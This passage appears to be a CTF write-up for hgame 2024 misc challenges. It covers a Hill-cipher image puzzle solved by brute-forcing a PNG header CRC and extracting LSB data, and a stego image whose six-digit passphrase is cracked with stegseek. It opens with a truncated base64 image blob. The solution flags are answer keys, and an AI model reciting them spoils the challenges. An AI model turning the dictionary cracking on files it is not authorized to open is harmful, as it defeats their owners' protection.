9NNmZLakdkNmFVc2xvYUxjdGE3UG5icFBYSExKSmJZWUlXbDBObkpjZHpFRnBYYi9Tc3pFbWU1L0pZNmlmTVlvUVB6d3d3L0hlbE5ET2pxTHYzMzc5dWJGRjE4MG5UcDFjcStpMERUdXF1MS90cDAybm5ycUtUdHUvL1RUVCs0VmxCcU5QN3Z2dnJ2cDM3OS83RHIzckNvMWI5TXhGZW84QXFSOC92bm5kdk5IR0VkR0lobUlGNkJVa2ZoSGFGVEpyWW1mcWo4MXlZcUNnaDVheUdnd1QwcmI1dFFENklVWFhvamtmZFAzVElFTTJsd2pLVFRXNkd6WVljT0d4VEp3cElta0tqY0hEeDVzZHdVcTBGV0tOTGFwSldEYzZET2p6NDUyR2lZeHlBL2czelRlcU5oVFJaOVJQUmMwOXZmdDI5ZnV4bFJDRzhId1RDOXRTa0twUTV2V2I0Vk9YdXQ3cXpGRDdmM2pPRjhKUW1QZklZY2NZdTY2NjY3RUp2KzFnMVRmQXgyMUVHZnExQmZWTTBZZHFwNTU1aG1iYk5QM1BNa1VjOUNHQXowdjR4QjhUOUgzOWI3NzdqUGJicnV0ZTZWNHFkT1pqb3ZJOWdnTG5aT3VnajIxeWticFVoR2tPb1lxdWE0NWVGeG9RNVUrbjh6YlVKR1ZLMWVhMzMvLzNWMmhWQkF2UUNuaUNZaFFhU0RkZSsrOTdTUkxrNjFDN21MWGdsaEJRN1hnekZUUjZiTkkyWGpqamMxNjY2M25ydkpENzVzcXZaNTc3am03NDZFUWdadFVCYXdtNi9vM0FrbWllMmFYWFhheGdTT05OMUVWRzYxS2swaE40c2FNR1dPT1B2cm9razhxcjczMjJ1YkdHMjgwbzBlUHR1TnoxUFQ5ZWVXVlYreTVoUHJzSkQxd0N1RGZsRkJRUUZvQjdVTE5RZlgzcU9PVnhoY0ZFWkthUUl3U3ovVFNwblhiRlZkY1lkZEJoZmplYTUybDlaYnVXWDJma3o0ZlVPSmNuMUVGTXVPVVNQV2hBcURPblR2SC91eG9QV05VTUYrb09FY3FRS3lkaWNYVW9VclBTVDB2WDN2dE5mdThqckw5djc2TzRjT0hsOXo2UUo5bHJkT3lIVFBVTlUySkM1TC9wVTFKZFNYWDFjbEQ4emM5VTZPU21vOVBtalRKN3FabDNnYWdQTVFMVUVwSS9DTXZOTW5TWk92dHQ5KzJDK044TGVZVXVORU9nYkZqeDlyZE9FRVhhejdua21sQUx0U2dyS3JacTYrKzJnWVp0ZnNwSHdVQWpSbzFzZ3RiS21CUkRIUnZ0bXpaMGhiOUtHaWpNK2NLdWVOSndaTHJyNy9ldlBYV1cvYWUwaVNPUmViLzBmaWkzVW5xd2pKbnpodzcyUzFrVUZvVGJMWHZUWDEvOXQxM1h4c2dCMUM4VWp2SUZmalRtSk92QmIzbVU5b2RPR1hLRkp1d292MTc3bmltbDY1VThrRHZ1OVlwdXIvQ3BzK1N4Z2F0czdUZUtxWjdWdXZmVklGalBvcklDN0VXMXZ4TWhhTGp4NCszNi9zdzZmMEk2OStRaW5OTW1EREJ2dGY1ZU1Zb2RxSVlpc2JCWWc0UWI3REJCdmFlZlBQTk4yMkJ3MEVISGVSK0piLzAvbDUyMldWMnJIL3l5U2Z0eHBWU1hCK29pNFU2cm1RYnExUHlYMjMvU2Y0ak5YOGJPSENnZmNacURDL1UvQzFWcURscjFpdzdIMmNYTFlCTWlCZWdWRlJhc21USm4rN25RTjRzWDc3Y3pKdzUwN3o2NnF0Mmwva25uM3ppZmlVN1doVHFiUHpXclZ0bk5VQVBHalRJbkhMS0tlNHFQWjA3cUNyN0tIYkZMMXk0MEZiQ3E0SjIzTGh4N2xWL2VvLzBmaDErK09IMmZNQmlEUjRBb3Z2bWpUZmVzT09ORnA2NkRvc0NJMHBrNzdQUFB2WnN4TTAzM3p5V3hUTWFZODg0NHd3emZmcDA5MHI1TkI0b0taK3Y0cXp5cUxYYTExOS9iUXUyUm80Y2FWNS8vZlZRejFmVGViZHQyclF4Qng1NG9FM2lyTFhXV3U1WEFNU1I1b2czMzN5em5Xc0YwYlZyVjNQeHhSZTdxOHlXTGwxcXh4dk4vWlJVeklYR2xNTU9POHkwYXRYS05HalFnRUtpQXVDWlhwclVnbFZyeDVkZWVza2VJNWZMOTEzdHJGVkUwclp0VzFPelprMzNhdkg2ODg4L3paZGZmbWtUTUVxR1pMdnUxdnJ4aEJOT01NY2NjNHlwVjY5ZVFlOE56UlUvL1BCRGUvN3BzODgrbS9YM1gvZjR5U2VmYk5mQTJqR2ZqOTNjWVQxamxDVFRzMFh2dHhMUnBWaDBwTS91OTk5L2I5L1BVYU5HMlI5aHJSRU9PT0FBbXlCVWdSSHJBeUQvVkJDaVpQeUlFU1BzdmF4TkFHSFFzMGxGQmdjZmZMRFpjODg5N1pGQnBkS3BBeWhWeEF2eUw4NHhaR1NQeEQ4S1RvR2NiNzc1eHJ6MzNudDJRZi91dSsvYUhmZ3pac3o0MThKT2dUaFZndSs4ODg1bXA1MTJzdWVSNlllcXMzTFJ1M2R2YysyMTE3cXI5TTQ3N3p6YkJpM1h2ek5YZWhCOTlORkhadmJzMlhZQ3JmZndpeSsrK05jRVdnK1pyYmJhNnUvM1RBOGFYYk80UlNuU2VLTUEwcWVmZm1yZWYvOTlNM2Z1WEh2dktJQTRiZG8wOTd2K2o0SnVqUnMzdHZlN2dzTnFBN1hOTnR2WVlPSFdXMjl0MjlFbVlXR1pwRWxiNm52MCtlZWYyekZPd1dxTmN3cjY2cnE4Z0xXUysxcjBiN0xKSm1iSEhYZjgrOW1nNzFQVVl6VUFQL2xleUsrcTdGenFxNisrS25lY1NZMHhHaHUzMzM1N082ZlN6NnRVcVVKd01VS2wra3d2ZGF1dUhYWHY2c2VTSlV2K3RYWk1mYiszMkdJTDA3QmhRN3NHMm1HSEhXenhkcWwrbjFQdm5icnc2WDdSZTFmZStuSFZNVS92bTQ2Z2k4djZjY1dLRmZacjFyOUJud0dOMmVXTjIyWGpCdm8zNkw0dlpNQlZ6N09QUC83WWZwMzZvYSt4dlBGSjc3UEdJLzNRKzYwZlljUTRpbzIrOTk5Kys2MlpOMitlZlM4LytPQ0RDbU1nd3ZvQWlDY1Y5ZWk1L2Rsbm45bjUyNElGQyt6ektGVWNVTGE0YTlYNW04Wkx6ZGwwVDIrNzdiWTIwVS9oTFZCYWlCZmtuLzU5SlA2TEQ0bC9sQnhOT3RYU1RBK05JQzY4OEVMYjlsUG5WUU5BRWdTZHRJbDJVR3JTQ2dCUktPUkNIZ0FBQUFBQUpBUHhndnhUY1lOaXlPcTRsZzZKLzJTaGx5Rkt6cSsvL3VyVkxsQVZYQ1Q5QVFBQUFBQUFBQUFBVUF3V0wxNmNNZWt2NnFTMjNucnJ1U3ZFSFlsL2xCd2wvdFVlTGlpMWhnT0FKS2xjdVhMZ3laaGE3UUVBQUFBQUFBQUFTb2VPVWdwQ3NXYjlRREtRK0VmSldiUm9rZm42NjYvZFZXYmE4UThBU2FLa3Y4NDVEV0wrL1BudVp3QUFBQUFBQUFDQVVoQTBMcXdjMlZwcnJlV3VFSGNrL2xGeWxQUVAwcjVFZHR4eFJ4TC9BQkpIeDVOc3RkVlc3aXE5VHovOTFDeGJ0c3hkQVFBQUFBQUFBQUNLMmZMbHl3TjN4dDUwMDAzTm1tdXU2YTRRZHlUK1VYSm16NTd0ZnBhWkVtZlZxMWQzVndDUURFcjhCeTFhMHBqNDdiZmZ1aXNBQUFBQUFBQUFRREZidUhDaGVlKzk5OXhWZXB0dnZqazcvaE9FeEQ5S3lwSWxTOHc3Nzd6anJqS3JXN2R1NEhPeUFTQXVLbFdxWk1ldklLWlBuMjZtVFp2bXJnQUFBQUFBQUFBQXhlenR0OTgyYjc3NXBydEtiL3Z0dDNjL1F4S1ErRWRKK2ZMTEw4Mjc3NzdycmpMYmV1dXQ3YzVaQUVpYU9uWHEyT05LZ2hnMWFwUlp2SGl4dXdJQUFBQUFBQUFBRkNQRmdZY05HK2F1MG12V3JKbXBYYnUydTBJU2tQaEhTWmt4WTRaNS8vMzMzVlY2RzI2NG9kbDExMTNkRlFBa2k0NHEwY1FzaVA3OSs1dmh3NGViUC8vODA3MENBQUFBQUFBQUFDZ21pdjhPSERqUXhvT0QyRzIzM1V5TkdqWGNGWktBeEQ5S2hxcVl4bzBiNTY0eWE5cTBLWlZNQUJKTHg1VHN1ZWVlN2lxenUrNjZ5N3o2NnFzay93RUFBQUFBQUFDZ3lLeGN1ZElNR1RMRTNIYmJiZTZWekZxMGFHSFdXV2NkZDRVa3FMUmt5UklpL0NnSjQ4ZVBOeWVlZUtMNTczLy82MTVKNzdMTExqUFhYSE9OV1d1dHRkd3JBSkFzOCtmUE4yZWZmWGJnODVyVTZlUzY2NjR6eHgxM25ObGdndzNjcXdDUVA4dVhMemMzMzN5ejZkT25qM3NsdmE1ZHU1cUxMNzdZWFFIeHBtUEc5Q3d1RmZYcTFUT2JicnFwdXdJQUZMdDU4K2FaUllzV3Vhdml0c1lhYTVpZGR0ckpyTC8rK3U0VklMbCsvdmxuTTNmdVhQUDc3Nys3VjRyYlpwdHR4dm5rQ1VXOElGeDZaai82NktQMi9ReWFJMnZUcG8zcDFhdVhxVjY5dW5zRlNVRGlIeVZoNmRLbE5wbjE1Sk5QdWxjeUd6QmdnR25kdXJXN0FvRGsrZU9QUDh5RER6NW9ycjMyV3ZkS01OdHR0NTA1OXRoalRhdFdyZXppU04wREFDQWZXTWlqbUEwYU5NaWNjc29wN3FyNGpSa3p4blpOQXdDVWhwNDllNW9iYnJqQlhSVTN0VGwrN0xISDdGb1pTTHBQUHZuRW5ISEdHV2I2OU9udWxlTEdHaks1aUJma2J0bXlaYlpRYitUSWtUYnB2M0RoUXZjcndUejAwRU0yUmx5cFVpWDNDcEtBVnY4b0NXUEhqcldCdDZBT1BQQkFzOHN1dTdnckFFaW0xVmRmM1hUbzBNSHN0OTkrN3BWZ3RBanMxcTJiMlhmZmZVM05talZObFNwVlRMdDI3Y3c3Nzd6amZnY0FBQUFBQUFBQUlFNFV2MVVjVi9GY3hYVVYzMVZyZjkra3YyTEtMVnUySk9tZlFDVCtVZlFXTEZoZ0huLzg4Y0R0UzBUbllsZXRXdFZkQVVCeTFhcFZ5NXgvL3ZtMmpYOHVKazZjYUZhc1dPR3VBQUFBQUFBQUFBQnhvdml0NHJpNVVJZWI4ODQ3anhiL0NVWGlIMFh0bDE5K3NlMUlkTDUvVUJyVTFONWFPMlVCb0Jpb092T2FhNjV4VndBQUFBQUFBQUFBL0pNMmora29uejMyMk1POWdxUWg4WStpOWZ2dnY1dW5ubnJLOU9yVnk3MFN6Q0dISEdKMjJHRUhkd1VBeWJmR0dtdVlVMDg5MWR4MDAwM3VGUUFBQUFBQUFBQUEvcUtrZjVjdVhXeU9qQmIveVVYaUgxNCsrK3d6ODl4eno5bWQ5SEdtcFArQUFRUE03YmZmN2w0SlJydjlEei84Y0ZPNWNtWDNDZ0FVaDNYV1djZTIvTy9aczJmT2JmOEJBQUFBQUFBQUFNVkJSMS9mYzg4OTVvd3p6ckNieUpCY0pQN2haZVhLbGVheHh4NHpCeDk4c0JrOGVMQlp2bnk1KzVYNCtPMjMzOHlqano1cXJyamlDcTl6L2VXWVk0NHg5ZXZYZDFjQVVGeFUxS1NkL3hxL216ZHY3bDRGQUFBQUFBQUFBSlNpVHAwNjJYanhFVWNjUWRLL0NKRDRSMVptenB4cFRqNzVaTk94WTBjemRPalEyQlFBTEZxMHlIVHQydFZjZGRWVjNrbi8vZmJienh4MzNIRU1iQUNLbXRvME5XblN4QXdaTXNUMDdkdlhOR3JVeVAwS0FBQUFBQUFBQUtBVWFHTll2Mzc5ekNPUFBHSjIyV1VYMnZzWGlVcExsaXo1MC8wY3lPaVRUejZ4clQ2bVQ1L3VYdm1MRWtlbm5IS0thZCsrdlcwSlVtamE1VDk4K0hCejU1MTNtamx6NXJoWGcxUGI2OTY5ZTVzT0hUcTRWd0NnTk9ob0ZCVnp2Znp5eTdhUVMrTjhSY2FNR1dPYU5tM3FyZ0FnZHlvZXZmbm1tMDJmUG4zY0srbXB3UFBpaXk5MlZ3QUFBQUFBb0JnUkw4ak90R25UVE11V0xkM1Z2K200YStYeERqMzBVSnZYWXlOczhXSEhQMEtocE5GRkYxMWtHamR1YlA4N2RlcFVzMkxGQ3ZlcithT0UxUnR2dkdHTER0U0JJSnVrdjF4d3dRV21YYnQyN2dvQVNvY21kMHJtMzNMTExYWmlxSEgwaFJkZXNKTmx0WGRxMWFwVkpBVmRBQUFBQUFBQUFBQi9pdWNxcnF2NHJ1SzhpdmNxN3F2NHIrTEFpZ2VUOUM5TzdQaUhsNHAyL0pjblZUbDA4TUVIbTRZTkc1cDExMTNYL1VwdVZxNWNhUllzV0dCMytELy8vUE8yNkNBWGh4OSt1T25ldmJ1cFZxMmFld1VBQUFDRlFBVS9BQUFBQUFBb2kzZ0JrQjEyL0NOdlZDUnczMzMzbVRadDJwZ2FOV3FZamgwN21oNDllcGpSbzBlYitmUG5tNlZMbDVvLy8weGZkNklkL1lzWEx6YXpaODgyZ3djUHRnUDNicnZ0Wm5iZWVXZDdqbit1U1grZDY5K2xTeGVTL2dBQUFBQUFBQUFBQUFBU2k4US9DbWJzMkxHMlF1dXd3dzR6RFJvME1GdHNzWVU5VzErZEFiVHIvcGhqanZuN1IvUG16VTJWS2xYTUpwdHNZbXJYcm0zMjJtc3YyOHIvaVNlZVNIdit0QThsL2UrNTV4NVRwMDRkOXdvQUFBQUFBQUFBQUFBQUpBK0pmMFJ1NGNLRlp0U29VYloxZitwSHRtZjFCOVcyYlZ2YmpZQ2tQd0FBQUFBQUFBQUFBSUNrSS9HUGtuUEtLYWVZQng1NHdHeXp6VGJ1RlFBQUFBQUFBQUFBQUFCSUxoTC9LQmxWcTFZMTk5OS92N25ycnJ2TXBwdHU2bDRGQUFBQUFBQUFBQUFBZ0dRajhROHZxNjIybWxsampUWGNWWEowNnRUSnZQVFNTM2EzZitYS2xkMnJBQUFBQUFBQUFBQUFBSkI4SlA3aFJlM3huMzMyV2RPdFd6ZTdnejd1OXQ5L2YvUEtLNitZeHg5LzNEUm8wTUM5Q2dBQUFBQUFBQUFBQUFERmc4US92Rld2WHQxMDd0elp6Sm8xeS9UdDI5Y20xK05HTy95SER4OXVCZzRjYVBiZGQ5OUVkaWtBQUFBQUFBQUFBQUFBZ0NCSS9DTnJHMnl3Z1Uyd0R4NDgyTXllUGR0MDc5N2Q3TFhYWHU1WEMwOS90NzZHT1hQbW1LZWVlc3JzdmZmZUpQd0JBQUFBQUFBQUFBQUFGTDFLUzVZcytkUDlITWpabjMvK2FYNzY2U2Z6N3J2dm1zbVRKNXZSbzBlYmFkT211VjhOVi8zNjljMGVlK3hoOXR0dlAvdmZhdFdxbVVxVktybGZCUUFBQUFBQUFBQUFBSURTUU9JZmViZGl4UXF6Y09GQzg4VVhYNWlQUHZybzc4S0FYMzc1eGI1ZVVXSEFkdHR0WityV3JXdFdXMjAxKy9QYXRXdmIvMjYxMVZabTg4MDNOK3V0dDU3N25RQUFBQUFBQUFBQUFBQlF1a2o4QXdBQUFBQUFBQUFBQUFDUVlKenhEd0FBQUFBQUFBQUFBQUJBZ3BINEJ3QUFBQUFBQUFBQUFBQWd3VWo4QXdBQUFBQUFBQUFBQUFDUVlDVCtBUUFBQUFBQUFBQUFBQUJJTUJML0FBQUFBQUFBQUFBQUFBQWtHSWwvQUFBQUFBQUFBQUFBQUFBU2pNUS9BQUFBQUFBQUFBQUFBQUFKUnVJZkFBQUFBQUFBQUFBQUFJQUVJL0VQQUFBQUFBQUFBQUFBQUVDQ2tmZ0hBQUFBQUFBQUFBQUFBQ0RCU1B3REFBQUFBQUFBQUFBQUFKQmdKUDRCQUFBQUFBQUFBQUFBQUVnd0V2OEFBQUFBQUFBQUFBQUFBQ1FZaVg4QUFBQUFBQUFBQUFBQUFCS014RDhBQUFBQUFBQUFBQUFBQUFsRzRoOEFBQUFBQUFBQUFBQUFnQVFqOFE4QUFBQUFBQUFBQUFBQVFJS1IrQWNBQUFBQUFBQUFBQUFBSU1GSS9BTUFBQUFBQUFBQUFBQUFrR0FrL2dFQUFBQUFBQUFBQUFBQVNEQVMvd0FBQUFBQUFBQUFBQUFBSkJpSmZ3QUFBQUFBQUFBQUFBQUFFb3pFUHdBQUFBQUFBQUFBQUFBQUNVYmlId0FBQUFBQUFBQUFBQUNBQkNQeER3QUFBQUFBQUFBQUFBQkFncEg0QndBQUFBQUFBQUFBQUFBZ3dVajhBd0FBQUFBQUFBQUFBQUNRWUNUK0FRQUFBQUFBQUFBQUFBQklNQkwvQUFBQUFBQUFBQUFBQUFBa2xqSC9EL1dZRGs5MC9lSmhBQUFBQUVsRlRrU3VRbUND)

解码并 OCR 得到 flag。

`hgame{s1mple_attack_for_zip}`

### 希儿希儿希尔

> Ch405 是一名忠实的希儿厨，于是他出了一道这样的题，不过他似乎忘了这个加密的名字不是希儿了（x 虽然经常有人叫错
> 补充： 图片打不开是正常现象,需要修复 最终得到的大写字母请用 hgame{}包裹

![](./MCBobOF57oEGudxd3aucjrNznrg.png)

![](./Z5ZFbS4dLoXzQ5xjZU6culJenBf.png)

文件尾部有一个嵌入的 zip。打开是一串大写字母。结合标题猜测是希尔密码。

PNG 头需要修复。爆破一下吧。

```python
import itertools as it
import zlib

from pwn import *
from tqdm import tqdm

ORIG_WH = b"\x00\x00\x05\xa4"
HEADER_TEMPLATE_1 = b"\x49\x48\x44\x52"
HEADER_TEMPLATE_2 = b"\x08\x02\x00\x00\x00"
TARGET_CRC32 = u32(b"\x12\x1b\x80\x4d", endian="big")

for w, h in tqdm(list(it.product(range(1, 2000), range(1, 2000)))):
    header = (
        HEADER_TEMPLATE_1
        + p32(w, endian="big")
        + p32(h, endian="big")
        + HEADER_TEMPLATE_2
    )
    crc32 = zlib.crc32(header) & 0xFFFFFFFF
    if crc32 == TARGET_CRC32:
        success(f"Correct size: w {w}; h {h}")
        break
```

```bash
(pwnenv) PS D:\Workspace\rev\hgame_2024> & d:/Workspace/pwnenv/Scripts/python.exe d:/Workspace/rev/hgame_2024/seele/brute.py
 70%|██▊ | 2781275/3996001 [00:50<00:22, 53684.26it/s]
 [+] Correct size: w 1394; h 1999
 70%|██▊ | 2786605/3996001 [00:50<00:21, 54983.86it/s]
(pwnenv) PS D:\Workspace\rev\hgame_2024>
```

那么修复文件。

![](./FwcJbVIvIoSg2rxRXArcyPk0n6b.png)

然后提取 LSB，得到 key matrix。

![](./LhZnblXbsotB6DxNr2OcNeXvnGc.png)

提取的 zip 中是密文。解密即可。

![](./TB0kb1JqAoQRT9xoXDecyeZRn89.png)

`hgame{DISAPPEARINTHESEAOFBUTTERFLY}`

### 来自星尘的问候

> 一个即将发售的游戏的主角薇 ^3 带来了一条消息。这段消息隐藏在加密的图片里 但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。 也许游戏的官网上有这种文字的记录?
> 补充：flag 格式为 `hgame\{[a-z0-9_]+\}`

可以抓到网站上的资源。

![](./ZayTbmOyAoDZwRxjtJOca9wRnZd.png)

从上到下：A-Z；a-z；0-9。

~~没用啊，图片里面也没隐写啊~~

找点工具

生成六位数密码：

```bash
#!/usr/bin/env bash

for i in $(seq -w 000000 999999); do
    echo $i
done
```

还真行

```plain-text
┌──(kali㉿kali)-[~]
└─$ stegseek --crack ~/secret.jpg -wl ~/wordlist.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123456"          

[i] Original filename: "secret.zip".
[i] Extracting to "secret.jpg.out".

┌──(kali㉿kali)-[~]
└─$
```

![](./MbaVbpiauotMskxZXL1cTBGUnGg.png)

`hgame{welc0me!}`
